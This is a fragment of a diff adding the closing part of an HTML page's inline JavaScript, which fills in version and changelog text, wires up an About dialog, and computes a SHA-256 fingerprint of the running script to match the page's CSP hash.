+  $('toolVer').textContent = `v${TOOL_VERSION}`; $('aboutVer').textContent = TOOL_VERSION; $('aboutFp').textContent = TOOL_FP;
+  $('changelog').innerHTML = CHANGELOG.map(([v, d, items]) => `<section class="cl"><h4>${esc(v)}<span>${esc(d)}</span></h4><ul>${items.map(x => `<li>${esc(x)}</li>`).join('')}</ul></section>`).join('');
+  const dlg = $('about');
+  $('aboutBtn').addEventListener('click', () => dlg.showModal());
+  $('aboutClose').addEventListener('click', () => dlg.close());
+  dlg.addEventListener('click', e => { if (e.target === dlg) dlg.close(); });
+}
+
+// Fingerprint of the exact script text that is running; equals the hash pinned in the page's CSP.
+let TOOL_FP = 'unavailable';
+try { const h = new Sha256(); h.update(new TextEncoder().encode(document.currentScript.textContent)); TOOL_FP = h.hex(); } catch {}
+init();
+})();
+</script>
+</body>
+</html>
